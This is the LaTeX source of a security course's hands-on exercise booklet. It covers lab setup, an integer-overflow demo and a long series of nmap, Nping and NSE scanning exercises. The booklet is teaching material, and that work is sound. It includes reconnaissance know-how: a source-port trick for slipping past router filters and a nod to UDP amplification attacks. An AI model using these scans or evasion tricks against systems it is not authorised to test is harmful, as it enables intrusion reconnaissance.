\documentclass[a4paper,11pt,notitlepage]{report}
% Henrik Kramselund, February 2001
% hlk@security6.net,
% My standard packages
\usepackage{zencurity-network-exercises}

\begin{document}

\rm
\selectlanguage{english}

\newcommand{\kursus}[1]{Security in Web Development elective course}
\newcommand{\kursusnavn}[1]{Security in Web Development elective\\ exercises}

\mytitle{Elective Security in Web Development, KEA}{exercises}

\setcounter{tocdepth}{0}

\normal

{\color{titlecolor}\tableofcontents}
%\listoffigures - not used
%\listoftables - not used

\normal
\pagestyle{fancyplain}
\chapter*{\color{titlecolor}Preface}
\markboth{Preface}{}

This material is prepared for use in \emph{\kursus} and was prepared by
Henrik Kramselund, \link{http://www.zencurity.com} .
It describes the networking setup and
applications for trainings and courses where hands-on exercises are needed.

Further a presentation is used which is available as PDF from kramse@Github\\
Look for \jobname in the repo security-courses.

These exercises are expected to be performed in a training setting with network connected systems. The exercises use a number of tools which can be copied and reused after training. A lot is described about setting up your workstation in the repo

\link{https://github.com/kramse/kramse-labs}


\section*{\color{titlecolor}Prerequisites}

This material expect that participants have a working knowledge of
TCP/IP from a user perspective. Basic concepts such as web site addresses and email should be known as well as IP-addresses and common protocols like DHCP.

\vskip 1cm
Have fun and learn
\eject

% =================== body of the document ===============
% Arabic page numbers
\pagenumbering{arabic}
\rhead{\fancyplain{}{\bf \chaptername\ \thechapter}}

% Main chapters
%---------------------------------------------------------------------
% gennemgang af emnet
% check questions

\chapter*{\color{titlecolor}Exercise content}
\markboth{Exercise content}{}

Most exercises follow the same procedure and has the following content:
\begin{itemize}
\item {\bf Objective:} What is the exercise about, the objective
\item {\bf Purpose:} What is to be the expected outcome and goal of doing this exercise
\item {\bf Suggested method:} suggest a way to get started
\item {\bf Hints:} one or more hints and tips or even description how to
do the actual exercises
\item {\bf Solution:} one possible solution is specified
\item {\bf Discussion:} Further things to note about the exercises, things to remember and discuss
\end{itemize}

Please note that the method and contents are similar to real life scenarios and does not detail every step of doing the exercises. Entering commands directly from a book only teaches typing, while the exercises are designed to help you become able to learn and actually research solutions.


\chapter{Download Debian Administrator’s Handbook (DEB) Book 10 min}
\label{ex:sw-downloadDEB}

\hlkimage{3cm}{book-debian-administrators-handbook.jpg}


{\bf Objective:}\\
We need a Linux for running some tools during the course. I have chosen Debian Linux as this is open source, and the developers have released a whole book about running it.

This book is named
\emph{The Debian Administrator’s Handbook},  - shortened DEB

{\bf Purpose:}\\
We need to install Debian Linux in a few moments, so better have the instructions ready.

{\bf Suggested method:}\\
Create folders for educational materials. Go to download from the link \url{https://debian-handbook.info/}
Read and follow the instructions for downloading the book.

{\bf Solution:}\\
When you have a directory structure for download for this course, and the book DEB in PDF you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Debian Linux is a free operating system platform.

The book DEB is free, but you can buy/donate to Debian, and I recommend it.

Not curriculum but explains how to use Debian Linux



\chapter{Download Kali Linux Revealed (KLR) Book 10 min}
\label{ex:sw-downloadKLR}


\hlkimage{3cm}{kali-linux-revealed.jpg}

\emph{Kali Linux Revealed  Mastering the Penetration Testing Distribution}


{\bf Objective:}\\
We need a Kali Linux for running tools during the course. This is open source, and the developers have released a whole book about running Kali Linux.

This is named Kali Linux Revealed (KLR)

{\bf Purpose:}\\
We need to install Kali Linux in a few moments, so better have the instructions ready.

{\bf Suggested method:}\\
Create folders for educational materials.

Current link, may be updated:\\
\link{https://kali.training/}

Read and follow the instructions for downloading the book.

{\bf Solution:}\\
When you have a directory structure for download for this course, and the book KLR in PDF you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux is a free pentesting platform, and probably worth more than \$10.000

The book KLR is free, but you can buy/donate, and I recommend it.



\chapter{Check your Debian Linux VM 10 min}
\label{ex:sw-basicDebianVM}

\hlkimage{10cm}{debian-xfce.png}

{\bf Objective:}\\
Make sure your virtual Debian server is in working order.

We need a Debian Linux for running a few extra tools during the course.

{\Large \bf This is a bonus exercise - only one Debian is needed per team.}

{\bf Purpose:}\\
If your VM is not installed and updated we will run into trouble later.

{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/kramse-labs/}

Read the instructions for the setup of a Kali VM.

{\bf Hints:}\\

{\bf Solution:}\\
When you have a updated virtualisation software and Kali Linux, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.


\chapter{Check your Kali VM, run Kali Linux 30 min}
\label{ex:sw-basicVM}

\hlkimage{10cm}{kali-linux.png}

{\bf Objective:}\\
Make sure your virtual machine is in working order.

We need a Kali Linux for running tools during the course.

{\bf Purpose:}\\
If your VM is not installed and updated we will run into trouble later.

{\bf Suggested method:}\\
Go to \link{https://github.com/kramse/kramse-labs/}

Read the instructions for the setup of a Kali VM.

{\bf Hints:}\\
If you allocate enough memory and disk you wont have problems.

{\bf Solution:}\\
When you have a updated virtualisation software and Kali Linux, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Kali Linux includes many hacker tools and should be known by anyone working in infosec.


\chapter{Investigate /etc 10 min}
\label{ex:sw-basicLinuxetc}


{\bf Objective:}\\
We will investigate the /etc directory on Linux. We need a Debian Linux and a Kali Linux, to compare

{\bf Purpose:}\\
Start seeing example configuration files, including:
\begin{itemize}
  \item User database \verb+/etc/passwd+ and \verb+/etc/group+
  \item The password database \verb+/etc/shadow+
\end{itemize}

{\bf Suggested method:}\\
Boot your Linux VMs, log in

Investigate permissions for the user database files \verb+passwd+ and \verb+shadow+

{\bf Hints:}\\
Linux has many tools for viewing files, the most efficient would be less.

\begin{alltt}
hlk@debian:~$ cd /etc
hlk@debian:/etc$ ls -l shadow passwd
-rw-r--r-- 1 root root   2203 Mar 26 17:27 passwd
-rw-r----- 1 root shadow 1250 Mar 26 17:27 shadow
hlk@debian:/etc$ ls
... all files and directories shown, investigate more if you like
\end{alltt}

Showing a single file: \verb+less /etc/passwd+ and press q to quit

Showing multiple files: \verb+less /etc/*+ then :n for next and q for quit

\begin{alltt}
Trying reading the shadow file as your regular user:
user@debian-9-lab:/etc$ cat /etc/shadow
cat: /etc/shadow: Permission denied
\end{alltt}

Why is that? Try switching to root, using su or sudo, and redo the command.

{\bf Solution:}\\
When you have seen the most basic files you are done.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.

Sudo is a tool often used for allowing users to perform certain tasks as the super user. The tool is named from superuser do! \link{https://en.wikipedia.org/wiki/Sudo}


\chapter{Enable UFW firewall - 10 min}
\label{ex:debian-firewall}

{\bf Objective:}\\
Turn on a firewall and configure a few simple rules.

{\bf Purpose:}\\
See how easy it is to restrict incoming connections to a server.


{\bf Suggested method:}\\
Install a utility for firewall configuration.

You could also perform Nmap port scan with the firewall enabled and disabled.

{\bf Hints:}\\
Using the ufw package it is very easy to configure the firewall on Linux.

Install and configuration can be done using these commands.
\begin{alltt}
root@debian01:~# apt install ufw
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
  ufw
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 164 kB of archives.
After this operation, 848 kB of additional disk space will be used.
Get:1 http://mirrors.dotsrc.org/debian stretch/main amd64 ufw all 0.35-4 [164 kB]
Fetched 164 kB in 2s (60.2 kB/s)
...
root@debian01:~# ufw allow 22/tcp
Rules updated
Rules updated (v6)
root@debian01:~# ufw enable
Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
Firewall is active and enabled on system startup
root@debian01:~# ufw status numbered
Status: active

     To                         Action      From
     --                         ------      ----
[ 1] 22/tcp                     ALLOW IN    Anywhere
[ 2] 22/tcp (v6)                ALLOW IN    Anywhere (v6)
\end{alltt}

Also allow port 80/tcp and port 443/tcp - and install a web server. Recommend Nginx \verb+apt-get install nginx+

{\bf Solution:}\\
When firewall is enabled and you can still connect to Secure Shell (SSH) and web service, you are done.

{\bf Discussion:}\\
Further configuration would often require adding source prefixes which are allowed to connect to specific services. If this was a database server the database service should probably not be reachable from all of the Internet.

Web interfaces also exist, but are more suited for a centralized firewall.

Configuration of this firewall can be done using ansible, see the documentation and examples at \url{https://docs.ansible.com/ansible/latest/modules/ufw_module.html}

Should you have both a centralized firewall in front of servers, and local firewall on each server? Discuss within your team.


\chapter{Git tutorials - 15min}
\label{ex:git-tutorial}


\hlkimage{3cm}{git-logo.png}

{\bf Objective:}\\
Try the program Git locally on your workstation

{\bf Purpose:}\\
Running Git will allow you to clone repositories from others easily. This is a great way to get new software packages, and share your own.

Git is the name of the tool, and Github is a popular site for hosting git repositories.

{\bf Suggested method:}\\
Run the program from your Linux VM. You can also clone from your Windows or Mac OS X computer. Multiple graphical front-end programs exist too.


First make sure your system is updated, as root run:

\begin{minted}[fontsize=\footnotesize]{shell}
sudo apt-get update && apt-get -y upgrade && apt-get -y dist-upgrade
\end{minted}
You should reboot if the kernel is upgraded :-)

Second make sure your system has Git, ansible and my playbooks: (as root run, or with sudo as shown)
\begin{minted}[fontsize=\footnotesize]{shell}
sudo apt -y install ansible git
\end{minted}


Most important are Git clone and pull:
\begin{alltt}\footnotesize
user@Projects:tt$ {\bf git clone https://github.com/kramse/kramse-labs.git}
Cloning into 'kramse-labs'...
remote: Enumerating objects: 283, done.
remote: Total 283 (delta 0), reused 0 (delta 0), pack-reused 283
Receiving objects: 100% (283/283), 215.04 KiB | 898.00 KiB/s, done.
Resolving deltas: 100% (145/145), done.

user@Projects:tt$ {\bf cd kramse-labs/}

user@Projects:kramse-labs$ {\bf ls}
LICENSE  README.md  core-net-lab  lab-network  suricatazeek  work-station
user@Projects:kramse-labs$ git pull
Already up to date.
\end{alltt}

If you want to install the Atom editor, you can run the Ansible playbook from the workstation directory.

Then run it with:
\begin{minted}[fontsize=\footnotesize]{shell}
cd ~/kramse-labs/workstation
ansible-playbook -v 1-dependencies.yml
\end{minted}



{\bf Hints:}\\
Browse the Git tutorials on \link{https://git-scm.com/docs/gittutorial}\\
and \link{https://guides.github.com/activities/hello-world/}

We will not do the whole tutorials within 15 minutes, but get an idea of the command line, and see examples. Refer back to these tutorials when needed or do them at home.

Note: you don't need an account on Github to download/clone repositories, but having an acccount allows you to save repositories yourself and is recommended.

{\bf Solution:}\\
When you have tried the tool and seen the tutorials you are done.

{\bf Discussion:}\\
Before Git there has been a range of version control systems,\\
see \link{https://en.wikipedia.org/wiki/Version\_control} for more details.



\chapter{Install JupyterLab -- up to 30min}
\label{ex-python-Jupyterlab}

\hlkimage{17cm}{python-jupyter.png}

{\bf Objective:}\\
Try using a programing library in the Python and R environment JupyterLab.

{\bf Purpose:}\\
This exercise will allow you to install programs using both apt and pip, package managers for Debian programs and Python programs.

{\bf Suggested method:}\\
Make sure Python3 PIP and R language are installed, as root do:
\begin{minted}[fontsize=\footnotesize]{shell}
root@debian:~# apt installSystem Integration python3-pip r-base
\end{minted}

Install jupyterlab using \verb+pip3+:
\begin{minted}[fontsize=\footnotesize]{shell}
root@debian:~# pip3 install jupyterlab
# ... lots of output
\end{minted}

\eject

Install jupyterlab \emph{kernel} using \verb+R+:
\begin{minted}[fontsize=\footnotesize]{shell}
root@debian:~# R                     \emph{// note this is a command named R, single capital}

R version 4.0.4 (2021-02-15) -- "Lost Library Book"
Copyright (C) 2021 The R Foundation for Statistical Computing
Platform: x86_64-pc-linux-gnu (64-bit)

R is free software and comes with ABSOLUTELY NO WARRANTY.
You are welcome to redistribute it under certain conditions.
Type 'license()' or 'licence()' for distribution details.

  Natural language support but running in an English locale

R is a collaborative project with many contributors.
Type 'contributors()' for more information and
'citation()' on how to cite R or R packages in publications.

Type 'demo()' for some demos, 'help()' for on-line help, or
'help.start()' for an HTML browser interface to help.
Type 'q()' to quit R.

> install.packages('IRkernel')
# ... lots of output
> IRkernel::installspec(user = FALSE)
[InstallKernelSpec] Installed kernelspec ir in /usr/local/share/jupyter/kernels/ir
> exit
\end{minted}



{\bf Hints:}\\
You can also just run JupyterLab on the web \smiley

{\bf Solution:}\\
When you can start JupyterLab and run Python3 from a Markdown document, you are done.


{\bf Discussion:}\\
Jupyter is a whole ecosystem and there is a lot of documentation available.

The main reason for installing it in this course is to make you able to install programs later in the course, and your life.



\chapter{Postman API Client 20 min}
\label{ex:postman-api}

%\hlkimage{10cm}{kali-linux.png}

{\bf Objective:}\\
Get a program capable of sending REST HTTP calls installed.


{\bf Purpose:}\\
Debugging REST is often needed, and some tools like Elasticsearch is both configured and maintained using REST APIs.

{\bf Suggested method:}\\
Download the app from
\link{https://www.postman.com/downloads/}

Available for Windows, Mac and Linux.

{\bf Hints:}\\
You can run the application without signing in anywhere.

{\bf Solution:}\\
When you have performed a REST call from within this tool, you are done.

Example: use the fake site \link{https://jsonplaceholder.typicode.com/todos/1} and other similar methods from the same (fake) REST API

If you have Elasticsearch installed and running try: \link{http://127.0.0.1:9200}

{\bf Discussion:}\\
Multiple applications and plugins can perform similar functions. This is a standalone app.

Tools like Elasticsearch has plugins allowing decoupling of the API and plugins. Example: \link{https://www.elastic.co/what-is/elasticsearch-monitoring} and \link{https://www.elastic.co/what-is/open-x-pack}



\chapter{Run small programs: Python, Shell script 20min}
\label{ex:small-python}

{\bf Objective:}\\
Be able to create small scripts using Python and Unix shell.

{\bf Purpose:}\\
Often it is needed to automate some task. Using scripting languages allows one to quickly automate.

Python is a very popular programming language. The Python language
is an interpreted, high-level, general-purpose programming language. Created by Guido van Rossum and first released in 1991.


You can read more about Python at:\\
\url{https://www.python.org/about/gettingstarted/} and \\
\url{https://en.wikipedia.org/wiki/Python_(programming_language)}

Shell scripting is another method for automating things on Unix. There are a number of built-in shell programs available.

You should aim at using basic shell scripts, to be used with \verb+/bin/sh+ - as this is the most portable Bourne shell.



{\bf Suggested method:}\\
Both shell and Python is often part of Linux installations.

Use and editor, leafpad, atom, VI/VIM, joe, EMACS, Nano ...

Create two files, I named them \verb+python-example.py+ and \verb+shell-example.sh+:

\VerbatimInput{python-example.py}

\VerbatimInput{shell-example.sh}

Unix does not require the file type .py or .sh, but it is often recommended to use it. To be able to run these programs you need to make them executable. Use the commands to set execute bit and run them:



Note: Python is available in two versions, version 2 and version 3. You should aim at running only version 3, as the older one is deprecated.

{\bf Hints:}\\
\begin{alltt}
$ chmod +x python-example.py shell-example.sh

$ ./python-example.py
21

$ ./shell-example.sh
Todays date in ISO format is: 2019-08-29
This system has 32 /etc/passwd users

\end{alltt}

{\bf Solution:}\\
When you have tried making both a shell script and a python program, you are done.

{\bf Discussion:}\\
If you want to learn better shell scripting there is an older but very recommended book,

\emph{Classic Shell Scripting
Hidden Commands that Unlock the Power of Unix}
By Arnold Robbins, Nelson Beebe. Publisher: O'Reilly Media
Release Date: December 2008
 \link{http://shop.oreilly.com/product/9780596005955.do}

\chapter{Small programs with data types 15min}
\label{ex:c-types}

{\bf Objective:}\\
Try out small programs similar to:
\inputminted{c}{programs/int1.c}

\begin{alltt}
user@Projects:programs$ gcc -o int1 int1.c && ./int1
First debug int is 32767
Second debug int is now -32768
\end{alltt}

{\bf Purpose:}\\
See actual overflows when going above the maximum for the selected types.


{\bf Suggested method:}\\
Compile program as is. Run it. See the problem.

Then try changing the int type, try with signed and unsigned. Note differences

{\bf Hints:}\\
Use a calculator to find the maximum, like $2^{16}$, $2^{32}$ etc.

{\bf Solution:}\\
When you have tried adding one to a value and seeing it going negative, you are done.

{\bf Discussion:}\\





\chapter{Optional: Run parts of a Django tutorial 30min}
\label{ex:django-intro}

{\bf Objective:}\\
Talk about web applications, how they are made.

{\bf Purpose:}\\
Know how you can get started using a framework, like Django\\ \link{https://www.djangoproject.com/}

{\bf Suggested method:}\\
We will visit a Django tutorial and talk about the benefits from using existing frameworks.

{\bf Hints:}\\
Input validation is a problem most applications face. Using Django a lot of functionality is available for input validation.

Take a look at Form and field validation:\\
\link{https://docs.djangoproject.com/en/2.2/ref/forms/validation/}

You can also write your own validators, and should centralize validation in your own applications.

\begin{minted}[fontsize=\small]{python}

  from django.core.exceptions import ValidationError
  from django.utils.translation import gettext_lazy as _

  def validate_even(value):
      if value % 2 != 0:
          raise ValidationError(
              _('%(value)s is not an even number'),
              params={'value': value},
          )
\end{minted}

Example from:
\link{https://docs.djangoproject.com/en/2.2/ref/validators/}

{\bf Solution:}\\
When we have covered basics of what Django is, what frameworks provide and seen examples, we are done.

{\bf Discussion:}\\
Django is only an example, other languages and projects exist.


\chapter{Execute nmap TCP and UDP port scan 20 min}
\label{ex:nmap-synscan}


{\bf Objective:} \\
Use nmap to discover important open ports on active systems

{\bf Purpose:}\\
Finding open ports will allow you to find vulnerabilities on these ports.

{\bf Suggested method:}\\
Use \verb+nmap -p 1-1024 server+ to scan the first 1024 TCP
ports and use Nmap without ports. What is scanned then?

Try to use \verb+nmap -sU+ to scan using UDP ports, not really possible if a firewall is in place.

If a firewall blocks ICMP you might need to add \verb+-Pn+ to make nmap scan even if there are no Ping responses

{\bf Hints:} \\
Sample command: \verb+nmap -Pn -sU -p1-1024 server+ UDP port scanning
1024 ports without doing a Ping first

{\bf Solution:}\\
Discover some active systems and most interesting ports, which are 1-1024 and the built-in list of popular ports.

{\bf Discussion:}\\
There is a lot of documentation about the nmap portscanner, even a book by the author
of nmap. Make sure to visit \link{http://www.nmap.org}

TCP and UDP is very different when scanning. TCP is connection/flow oriented and requires a handshake which is very easy to identify. UDP does not have a handshake and most applications will not respond to probes from nmap. If there is no firewall the operating system will respond to UDP probes on closed ports - and the ones that do not respond must be open.

When doing UDP scan on the internet you will almost never get a response, so you cannot tell open (not responding services) from blocked ports (firewall drop packets). Instead try using specific service programs for the services, sample program could be \verb+nsping+ which sends DNS packets, and will often get a response from a DNS server running on UDP port 53.


\chapter{Discover active systems ping and port sweep 15 min}
\label{ex:nmap-pingsweep}
\hlkimage{5cm}{nmap-zenmap.png}

{\bf Objective:}\\
Use nmap to discover active systems and ports

{\bf Purpose:}\\
Know how to use nmap to scan networks for active systems. These ports receive traffic from \emph{the internet} and can be used for DDoS attacks.

Tip: Yes, filtering traffic further out removes it from processing in routers, firewalls, load balancers, etc. So making a stateless filter on the edge may be recommended.

{\bf Suggested method:}\\
Try different scans,
\begin{itemize}
\item Ping sweep to find active systems
\item Port sweeps to find active systems with specific ports
\end{itemize}

{\bf Hints:} \\
Try nmap in sweep mode - and you may run this from Zenmap

{\bf Solution:}\\
Use the command below as examples:
\begin{itemize}
\item Ping sweep ICMP and port probes: \verb+nmap -sP 10.0.45.*+
\item Port sweeps 80/tcp and 443/tcp: \verb+nmap -p 80 10.0.45.*+
\item Port sweeps UDP scans can be done: \verb+nmap -sU -p 161 10.0.45.*+
\end{itemize}

{\bf Discussion:}\\
Quick scans quickly reveal interesting hosts, ports and services

Also now make sure you understand difference between single host scan
10.0.45.123/32, a whole subnet /24 ~250 hosts 10.0.45.0/24 and other more advanced targeteting like 10.0.45.0/25 and 10.0.45.1-10

We will now assume port 80/443 are open, as well as a few UDP services - maybe we can use them in amplification attacks later.



\chapter{Perform nmap OS detection}
\label{ex:nmap-os}

{\bf Objective:} \\
Use nmap OS detection and see if you can guess the brand of devices on the network

{\bf Purpose:}\\
Getting the operating system of a system will allow you to focus your next attacks.

{\bf Suggested method:}\\
Look at the list of active systems, or do a ping sweep.

Then add the OS detection using the option \verb+-O+

Better to use -A all the time, includes even more scripts and advanced stuff
See the next exercise.

{\bf Hints:} \\

The nmap can send a lot of packets that will get different responses, depending on the operating system. TCP/IP is implemented using various constants chosen by the implementors, they have chosen different standard packet TTL etc.

{\bf Solution:}\\
Use a command like \verb+nmap -O -p1-100 10.0.45.45+ or  \verb+nmap -A -p1-100 10.0.45.45+


{\bf Discussion:}\\
nmap OS detection is not a full proof way of knowing the actual operating system, but in most cases in can detect the family and in some cases it can identify the exact patch level of the system.

\chapter{Perform nmap service scan}
\label{ex:nmap-service}

{\bf Objective:} \\
Use more advanced features in Nmap to discover services.

{\bf Purpose:}\\
Getting more intimate with the system will allow more precise discovery of the vulnerabilities and also allow you to select the next tools to run.

{\bf Suggested method:}\\
Use \verb+nmap -A+ option for enabling service detection and scripts

{\bf Hints:} \\
Look into the manual page of nmap or the web site book about nmap scanning

{\bf Solution:}\\
Run nmap and get results.

{\bf Discussion:}\\

Some services will show software versions allowing an attacker easy lookup at web sites to known vulnerabilities and often exploits that will have a high probability of success.

Make sure you know the difference between a vulnerability which is discovered, but not really there, a false positive, and a vulnerability not found due to limitations in the testing tool/method, a false negative.

A sample false positive might be reporting that a Windows server has a vulnerability that you know only to exist in Unix systems.


\chapter{Optional: Nmap full scan}
\label{ex:nmap-strategy}


{\bf Objective:} \\
Documenting the security level of a network often requires extensive testing. Below are some examples of the scanning methodology needed.


{\bf Purpose:}\\
Doing a port scan often requires you to run multiple Nmap scans.


{\bf Suggested method:}\\
Use Zenmap to do:
\begin{enumerate}
\item A few quick scans, to get web servers and start web scanners/crawlers
\item Full scan of all TCP ports, -p 1-65535
\item Full or limited UDP scan, \verb+nmap -sU --top-ports 100+
\item Specialized scans, like specific source ports
\end{enumerate}


{\bf Hints:} \\
Using a specific source ports using -g/--source-port <portnum>: Use given port number with ports like FTP 20, DNS 53 can sometimes get around router filters and other stateless Access Control Lists

{\bf Solution:}\\
Run multiple nmap and get results. At least TCP and UDP top-ports 10.

{\bf Discussion:}\\
Recommendation it is highly recommended to always use:
\begin{alltt}
-iL <inputfilename>: Input from list of hosts/networks
-oA outputbasename: output in all formats, see later
\end{alltt}

Some examples of real life Nmaps I have run recently:
\begin{alltt}
dns-scan: nmap -sU -p 53 --script=dns-recursion -iL targets -oA dns-recursive
bgpscan: nmap -A -p 179 -oA bgpscan -iL targets
dns-recursive: nmap -sU -p 53 --script=dns-recursion -iL targets -oA dns-recursive
php-scan: nmap -sV --script=http-php-version -p80,443 -oA php-scan -iL targets
scan-vtep-tcp: nmap -A -p 1-65535 -oA scan-vtep-tcp 10.1.2.3 192.0.2.123
snmp-10.x.y.0.gnmap: nmap -sV -A -p 161 -sU --script=snmp-info -oA snmp-10xy 10.x.y.0/19
snmpscan: nmap -sU -p 161 -oA snmpscan --script=snmp-interfaces -iL targets
sshscan: nmap -A -p 22 -oA sshscan -iL targets
vncscan: nmap -A -p 5900-5905 -oA vncscan -iL targets
\end{alltt}




\chapter{Reporting HTML}
\label{ex:nmap-html}

\hlkimage{10cm}{nmap-html.png}

{\bf Objective:} \\
Show the use of XML output and convert to HTML

{\bf Purpose:}\\
Reporting data is very important. Using the oA option Nmap can export data in three formats easily, each have their use. They are normal, XML, and grepable formats at once.

{\bf Suggested method:}\\
\begin{alltt}
  sudo nmap -oA zencurity-web www.zencurity.com
  xsltproc zencurity-web.xml > zencurity-web.html
\end{alltt}

{\bf Hints:} \\
Nmap includes the stylesheet in XML and makes it very easy to create HTML.

{\bf Solution:}\\
Run XML through xsltproc, command line XSLT processor, or another tool

{\bf Discussion:}\\

Options you can use to change defaults:
\begin{alltt}
--stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
--webxml: Reference stylesheet from Nmap.Org for more portable XML
\end{alltt}

Also check out the Ndiff tool
\begin{alltt}
  hlk@cornerstone03:~$ ndiff zencurity-web.xml zencurity-web-2.xml
  -Nmap 7.70 scan initiated Fri Sep 07 18:35:54 2018 as: nmap -oA zencurity-web www.zencurity.com
  +Nmap 7.70 scan initiated Fri Sep 07 18:46:01 2018 as: nmap -oA zencurity-web-2 www.zencurity.com

   www.zencurity.com (185.129.60.130):
   PORT    STATE SERVICE VERSION
  +443/tcp open  https
\end{alltt}

(I ran a scan, removed a port from the first XML file and re-scanned)



\chapter{Optional: Nping check ports}
\label{ex:nping-tcp}
{\bf Objective:} \\
Show the use of Nping tool for checking ports through a network

{\bf Purpose:}\\
Nping can check if probes can reach through a network, reporting success of failure. Allows very specific packets to be sent.

{\bf Suggested method:}\\
\begin{alltt}\footnotesize
  root@KaliVM:~# nping --tcp -p 80 www.zencurity.com

  Starting Nping 0.7.70 ( https://nmap.org/nping ) at 2018-09-07 19:06 CEST
  SENT (0.0300s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (0.0353s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=49674 iplen=44  seq=3654597698 win=16384 <mss 1460>
  SENT (1.0305s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (1.0391s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=50237 iplen=44  seq=2347926491 win=16384 <mss 1460>
  SENT (2.0325s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (2.0724s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=9842 iplen=44  seq=2355974413 win=16384 <mss 1460>
  SENT (3.0340s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (3.0387s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=1836 iplen=44  seq=3230085295 win=16384 <mss 1460>
  SENT (4.0362s) TCP 10.137.0.24:3805 > 185.129.60.130:80 S ttl=64 id=18933 iplen=40  seq=2984847972 win=1480
  RCVD (4.0549s) TCP 185.129.60.130:80 > 10.137.0.24:3805 SA ttl=56 id=62226 iplen=44  seq=3033492220 win=16384 <mss 1460>

  Max rtt: 40.044ms | Min rtt: 4.677ms | Avg rtt: 15.398ms
  Raw packets sent: 5 (200B) | Rcvd: 5 (220B) | Lost: 0 (0.00%)
  Nping done: 1 IP address pinged in 4.07 seconds
\end{alltt}

{\bf Hints:} \\
A lot of options are similar to Nmap

{\bf Solution:}\\


{\bf Discussion:}\\
A colleague of ours had problems sending specific IPsec packets through a provider. Using a tool like Nping it is possible to show what happens, or where things are blocked.

Things like changing the TTL may provoke ICMP messages, like this:
\begin{alltt}\footnotesize
root@KaliVM:~# nping --tcp -p 80 --ttl 3 www.zencurity.com

Starting Nping 0.7.70 ( https://nmap.org/nping ) at 2018-09-07 19:08 CEST
SENT (0.0303s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (0.0331s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=28456 iplen=72 ]
SENT (1.0314s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (1.0337s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=28550 iplen=72 ]
SENT (2.0330s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (2.0364s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=28589 iplen=72 ]
SENT (3.0346s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (3.0733s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=29403 iplen=72 ]
SENT (4.0366s) TCP 10.137.0.24:37244 > 185.129.60.130:80 S ttl=3 id=60780 iplen=40  seq=1997801125 win=1480
RCVD (4.0558s) ICMP [10.50.43.225 > 10.137.0.24 TTL=0 during transit (type=11/code=0) ] IP [ttl=62 id=30235 iplen=72 ]

Max rtt: 38.574ms | Min rtt: 2.248ms | Avg rtt: 13.143ms
Raw packets sent: 5 (200B) | Rcvd: 5 (360B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 4.07 seconds
\end{alltt}



\chapter{Optional: Nmap Scripting Engine NSE scripts}
\label{ex:nmap-nse}

{\bf Objective:} \\
Show the use of NSE scripts, copy/modify a script written in Lua.

{\bf Purpose:}\\
Investigate the scripts from Nmap, copy one, learn how to run specific script using options

{\bf Suggested method:}\\
\begin{alltt}
# cd /usr/share/nmap/scripts
# nmap --script http-default-accounts.nse www.zencurity.com
# cp http-default-accounts.nse http-default-accounts2.nse
# nmap --script http-default-accounts2.nse www.zencurity.com
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-07 19:45 CEST
...
\end{alltt}

This will allow you to make changes to existing scripts.

{\bf Hints:} \\
We will do this quick and dirty - later when doing this at home, I recommend putting your scripts in your home directory or a common file hierarchy.

{\bf Solution:}\\
Other examples
\begin{alltt}
nmap --script http-enum 10.0.45.0/24
nmap -p 445 --script smb-os-discovery 10.0.45.0/24
\end{alltt}


{\bf Discussion:}\\
There are often new scripts when new vulnerabilities are published. It is important to learn how to incorporate them into your scanning. When heartbleed roamed I was able to scan about 20.000 IPs for Heartbleed in less than 10 minutes, which enabled us to update our network quickly for this vulnerability.

It is also possible to run categories of scripts:

\begin{alltt}
nmap --script "http-*"

		   nmap --script "default or safe"
			   This is functionally equivalent to nmap --script "default,safe". It loads all scripts that are in the default category or the safe category or both.

		   nmap --script "default and safe"
			   Loads those scripts that are in both the default and safe categories.
\end{alltt}

or get help for a script:

\begin{alltt}
# nmap -script-help http-vuln-cve2013-0156.nse
Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-07 19:00 CEST

http-vuln-cve2013-0156
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/http-vuln-cve2013-0156.html
  Detects Ruby on Rails servers vulnerable to object injection, remote command
  executions and denial of service attacks. (CVE-2013-0156)

  All Ruby on Rails versions before 2.3.15, 3.0.x before 3.0.19, 3.1.x before
